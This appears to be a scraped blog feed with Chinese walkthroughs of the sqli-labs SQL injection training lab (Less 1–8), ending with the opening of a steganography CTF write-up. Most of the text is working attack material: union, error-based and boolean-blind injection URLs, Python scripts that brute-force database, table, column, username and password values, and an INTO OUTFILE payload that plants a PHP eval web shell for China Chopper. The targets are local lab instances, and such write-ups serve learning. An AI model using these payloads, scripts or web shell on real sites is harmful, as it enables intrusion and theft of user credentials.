<code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and length(database())=8 %23</code><br><img src="http://img-blog.csdnimg.cn/20190729162613631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>长度为 8 时，返回正确结果，说明长度为 8；这里说明下，长度要一个一个的试，我这里是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。后面会为大家展示╰(￣ω￣ｏ)<br>3）猜数据库名字<br>首先猜测数据库第一位,这里使用了<code>left</code>函数   <code>left(a,b)</code>,返回a字符串靠左至b位数，详细看下面用法<br><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),1)&gt;&#39;a&#39;  --+</code><br><img src="http://img-blog.csdnimg.cn/201907291700425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Database()为 security，所以我们看他的第一位是否 <code>&gt; a</code>,很明显的是 <code>s &gt; a</code>,因此返回正确。当<br>我们不知情的情况下，可以用二分法来提高注入的效率。<br>继续爆第二位的话，代码如下：</p><pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),2)&gt;&#39;sa&#39;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729171002737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后第三位，第四位…   很麻烦，正经人谁用这啊，你用吗，反正我不用（手动滑稽）<br>这里还可以构造这样的命令 猜解数据库第一位 ：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),1,1)) &gt;80--+</code><br>第二位：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),2,1)) &gt;80 --+</code></p><p>格式就是这样，但这样的效率真的很…下面就演示下使用脚本盲注和burp爆破。╰(￣ω￣ｏ)</p><p>大佬的脚本（目前还不会写╯︿╰） 爆数据库 ：</p><pre><code># -*- coding:utf8 -*-import requestsurl = &#39;http://localhost/sqli-labs-master/sqli-labs-master/Less-8/?id=1%27&#39;  # 这个url要对应你自己的urlpayload = &quot; and%20left(&#123;d&#125;(),&#123;n&#125;)=%27&#123;s&#125;%27%20--%20k&quot;# 上面两个可以合并为一个,但没有必要,(本来就是我拆开的)list1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;]  # 字典str1 = &quot;You are in...........&quot;  # 就是通过返回的页面里有没有这个字符串来判断盲注有没有成功# 开始对比database()database = &#39;&#39;for i in range(1, 10):  # 相当于C语言的for循环1~9 其实这里应该先判断database有多长的    for ss in list1:  # 相当于for循环遍历list,然后把每一项赋值给ss        p = payload.format(d=&#39;database&#39;, n=i, s=database+ss)  # 把payload里的&#123;d&#125;,&#123;n&#125;,&#123;s&#125;赋值        u = requests.get(url+p)  # 访问网页        # print p        if str1 in u.content:  # 如果str在网页内容里面            database += ss            print u&quot;正在对比database第&quot;, i, u&quot;个字符&quot;,            print database            breakprint u&quot;对比成功,database为:&quot;, database# 开始对比user()#user也是同理user = &#39;&#39;for i in range(1, 20):    for ss in list1:        p = payload.format(d=&#39;user&#39;, n=i, s=user+ss)        u = requests.get(url+p)        # print p        if str in u.content:            user += ss            print u&quot;正在对比user第&quot;, i, u&quot;个字符&quot;,            print user            breakprint u&quot;对比成功,user为:&quot;, userprint u&quot;database--&gt;&quot;, databaseprint u&quot;user--&gt;&quot;, usera = raw_input()</code></pre><p>爆破成功<br><img src="http://img-blog.csdnimg.cn/20190729180251990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来猜解表</p><pre><code># -*- coding:utf8 -*-import requestsurl = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=&#39; \          &#39;database()%20limit%20&#123;t&#125;,1),&#123;w&#125;,1))=&#123;A&#125;%20--%20k&#39;# 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substrlist1 = [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]str1 = &quot;You are in...........&quot;tables1 = &#39;&#39;tables2 = &#39;&#39;tables3 = &#39;&#39;tables4 = &#39;&#39;for i in range(0, 4):   //这里要视情况而定,表的数量不定    for j in range(1, 10):        for s in list1:            p = payload.format(t=i, w=j, A=s)            u = requests.get(url+p)            if str1 in u.content:                if i == 0:                    tables1 += chr(s)                    print u&quot;正在对比第1个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;,tables1                elif i == 1:                    tables2 += chr(s)                    print u&quot;正在对比第2个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables2                elif i == 2:                    tables3 += chr(s)                    print u&quot;正在对比第3个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables3                elif i == 3:                    tables4 += chr(s)                    print u&quot;正在对比第4个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables4                    breakprint &#39;tables1--&gt;&#39;, tables1print &#39;tables2--&gt;&#39;, tables2print &#39;tables3--&gt;&#39;, tables3print &#39;tables4--&gt;&#39;, tables4a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729192033844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后盲注users的字段名：</p><pre><code># -*- coding:utf8 -*-import requestslist1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,          &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;,          &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;,          &#39;Z&#39;, &#39;.&#39;]  # 字典url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security&#39; \          &#39;%27%20and%20table_name=%27users%27%20limit%20&#123;w&#125;,1),&#123;n&#125;)=%27&#123;c&#125;%27%20--%20k&#39;# payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并column = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]str = &#39;You are in...........&#39;# 以上四个变量就是与本次盲注相关的变量了for j in range(0, 3):    for i in range(1, 9):        for l in list1:            p = payload.format(w=j, n=i, c=column[j]+l)            u = requests.get(url+p)            if str in u.content:                column[j] += l                print u&#39;正在对比第&#39;, j+1, u&#39;个字段第&#39;, i, u&#39;个字符&#39;, column[j]                breakfor c in range(0, 5):    print &#39;column&#39;, c+1, &#39;--&gt;&#39;, column[c]a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729192721615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后就是查看数据了</p><pre><code># -*- coding:utf8 -*-import requestslist1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,          &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;,          &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;,          &#39;Z&#39;, &#39;.&#39;]  # 字典url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;%20and%20left((select%20username%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;str = &#39;You are in...........&#39;username = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]password = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]for i in range(1, 15):    for j in range(1, 11):        for l in list1:            p = payload.format(n=i, w=j, d=username[i-1]+l)            u = requests.get(url+p)            if str in u.content:                username[i-1] += l                print u&#39;正在对比第&#39;, i, u&#39;个记录的username的第&#39;, j, u&#39;个字符&#39;, username[i-1]payload2 = &#39;%20and%20left((select%20password%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;for i in range(1, 15):    for j in range(1, 11):        for l in list1:            p = payload2.format(n=i, w=j, d=password[i-1]+l)            u = requests.get(url+p)            if str1 in u.content:                password[i-1] += l                print u&#39;正在对比第&#39;, i, u&#39;个记录的password的第&#39;, j, u&#39;个字符&#39;, password[i-1]print &#39;id    username    password&#39;for i in range(1, 15):    print i, &#39;-&#39;, username[i-1], &#39;-&#39;, password[i-1]a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729215820731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190729215835960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本盲注基本就是这些了，关于burp爆破就过段时间在写吧。(●’◡’●)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs闯关记录(Less1—8) 详细！</title>
      <link href="2019/07/28/Sqli-labs%E9%97%AF%E5%85%B3(Less1%E2%80%948)%20%E8%AF%A6%E7%BB%86%EF%BC%81/"/>
      <url>2019/07/28/Sqli-labs%E9%97%AF%E5%85%B3(Less1%E2%80%948)%20%E8%AF%A6%E7%BB%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>补课补课</p><p><strong>Less-1</strong>：</p><p>根据题目提示为单引号注入，先测试一下<br><img src="http://img-blog.csdnimg.cn/20190604202334654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>//注意这里使用  <code>#</code> 是不行的，游览器没有帮我们编码，所以我们自己编<br>   <code>%23</code> 为<code>#</code>的url编码，<code>--+</code>可以直接使用//</p><p>   即只有三个字段，那么现在开始联合查询：<br>   因为sql语句的执行结果<strong>只有第一行</strong>会被回显在页面上，所以我们要把原始语句的的结果集变为空，这样我们想要的结果才能显示在界面上<br>   同时又需要确定哪几个字段会被显示在页面上：<br>   <img src="https://img-blog.csdnimg.cn/20190609195252896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以看出2，3字段被显示出来，<br>   接着爆数据库<img src="https://img-blog.csdnimg.cn/20190609195604428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   看到数据库名为：<strong>security</strong>，接着再查其他信息</p><pre><code>   http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,2,concat_ws((char(32,58,32)),user(),database(),version())--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190609201140811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   这里我使用了<strong>concat_ws()</strong> 函数：<br>  concat_ws(separator,str1,str2,…)<br>  第一个参数是其它参数的分隔符。分隔符的位置放在要连 接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。<br>ps:<br> select concat_ws(‘,’,’11’,’22’,’33’);   　11,22,33<br> **group_concat()**： 使多行数据在一列显示<br> char(32,58,32)对应ascill码为<code>空格：空格</code><br>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本<br>我们还要知道在Mysql中有information_schema这个库，该库存放了所有数据库的信息。</p><pre><code>information_schema.columns包含所有表的字段information_schema.tables包含所有库的表名information_schema.schemata包含所有数据库的名table_schema 数据库名table_name 表名column_name 列名schema_name 数据库名</code></pre><p>OK 得到这些信息之后我们再来看看数据库有哪些表</p><pre><code>http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://img-blog.csdnimg.cn/2019060920432537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到有四张表，我们想要的信息基本都在<strong>user</strong>表下<br>我们对这张表爆列名：</p><pre><code>http://localhost/sqli-labs/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190609211043656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  接着进行爆用户信息</p><p><code>?id=0&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></p><p><img src="http://img-blog.csdnimg.cn/20190609211207363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者单独爆一个人</p><pre><code>?id=-1&#39;union select 1,username,password from users where id=2 --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190728231327714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>   OKヾ(≧▽≦*)o 第一关到此结束。</p><p>   <strong>Less-2</strong></p><p>看一下源代码，发现没有任何防护，连单引号都没有，可以直接联合查询</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190611172309372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以和第一题一样随便查了。<br>   <strong>Less-3</strong></p><p>1.输入?id=1’ –+ 页面报错<br><img src="http://img-blog.csdnimg.cn/20190611180106383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但输入?id=1’)  –+   页面是正常的<br><img src="http://img-blog.csdnimg.cn/20190611180950876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以可以判断出此题为字符串注入，以（’’)的方式闭合的。<br>OK 知道这些后 其余的步骤就同上了。</p><p><strong>less4</strong><br>这题的闭合方式为（” “）,多试几次就行了<br><img src="http://img-blog.csdnimg.cn/20190611182521357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其余同上。<br><strong>Less-5</strong> 双注入get单引号字符型注入<br>首先打开网页输入<code>?id=1</code><br><img src="http://img-blog.csdnimg.cn/20190611201540176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而并没有显示用户名和密码，这是咋回事？查看一下源代码</p><pre><code>if($row)    &#123;      echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;        echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;        &#125;</code></pre><p>可以看到根本就没有输出 $row 这个查询结果。<br>根据题目此题为双注入，查看了一些大佬的文章之后终于明白了，<br>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p><p><strong>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by cluase分组语句，按照cluase对查询结果分组</strong></p><p>详解请查看blog <a href="https://blog.csdn.net/Leep0rt/article/details/78556440">双注入详解</a>不懂的同学一定要看哦！</p><p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。 那么开始构建sql语句：</p><pre><code>Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  //这里我们给查询的数据起了另一个名：a</code></pre><p>group by a字段，就是a字段有多少不同的值就有多少组，例如A字段有“a,b,b,c,c,c,d”，abcd各分一组，总共4组<br><img src="http://img-blog.csdnimg.cn/20190612193104255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>OK得到数据库了，然后就可以以同样地方式得到其他信息。</p><p><strong>获取表名：</strong></p><pre><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190612200651311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>查询用户信息：</strong></p><pre><code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  </code></pre><p><img src="http://img-blog.csdnimg.cn/20190612200808485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第五关结束。<br><strong>Less-6</strong> 双注入GET双引号字符型注入<br>额 这题就是把上题的单引号变成了双引号。看看上面那题就好。</p><p><strong>Less-7</strong> 导出文件GET字符型注<br>打开页面输入<code>?id=1</code><img src="http://img-blog.csdnimg.cn/2019072118404036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>试了很多发现报错信息都一样，查看下源代码：</p><pre><code>if($row)    &#123;      echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in.... Use outfile......&#39;;      echo &quot;&lt;br&gt;&quot;;      echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    echo &#39;You have an error in your SQL syntax&#39;;</code></pre><p>发现 他把报错做了处理统一返回“You have an error in your SQL syntax”，同时他也给出了提示：<br>use outfile 也就是说需要使用outfile函数：<br>outfile函数就是将数据库的查询内容导出到一个外部文件<br>这时候就可以用菜刀了。</p><p>构造语句 写入<strong>一句话木马</strong> 就可以和菜刀连接了（ps：这里必须要写入根目录，不然菜刀没权限）<br><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code><br><img src="http://img-blog.csdnimg.cn/2019072822315399.png" alt="在这里插入图片描述"><br>可以看到文件已将写入目录下了，<strong>如果有无法写入的小伙伴可以私信我哦，或者在下面评论</strong>✪ ω ✪<br>打开菜刀，右键添加<code>http://127.0.0.1/123.php</code>地址填入你上传文件的地址，后面的小方框中填入你构造的密码，也就是<code>chopper</code><br><img src="http://img-blog.csdnimg.cn/20190728223632460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，就可以直接访问数据库了，嘿嘿嘿。<br><img src="http://img-blog.csdnimg.cn/20190728223719425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Level-8</strong> 布尔型单引号GET盲注)<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目已经提示了，为单引号盲注，先测试下<br><img src="http://img-blog.csdnimg.cn/20190727232549864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，注释后回显正常，确实是单引号注入，而且没有报错回显。接着用菜刀吧，步骤和上题一样，这里给出语句：<br><code>?id=1&#39; union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code> OK。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验吧--隐写术</title>
      <link href="2019/07/25/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>2019/07/25/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>1、欢迎来到地狱<br>2、stegas 300</p><a id="more"></a><p>小白一枚，趁着暑假来刷刷题，顺便记录下(。・∀・)ノ<br><strong>1、欢迎来到地狱</strong><br>连环套哦。格式CTF{xxxx}。<br>解题链接： <a href="http://ctf5.shiyanbar.com/stega/hell/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E5%9C%B0%E7%8B%B1.zip">http://ctf5.shiyanbar.com/stega/hell/欢迎来到地狱.zip</a><br>这题所涉及内容很丰富， 差点圆寂在这😂，呼~ 下面我就详细记录下这题的解题过程。<br>点击链接，下载了一个压缩包，打开<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709341928_201104351_H800.png" alt="在这里插入图片描述"><br>一张图片、一个加密文档、和一个压缩包；图片无法打开，拿去winhex分析下，<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777702242665_201104351_H800.png" alt="在这里插入图片描述"><br>图片是jpg格式的，jpg图片的文件头是:<code>FFD8FF</code>在winhex里面添加，保存然后就能打开了。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777708025783_201104351_H800.png" alt="在这里插入图片描述">emm…文字看着是没啥信息，图片的详细信息也没啥东西，点击链接：<a 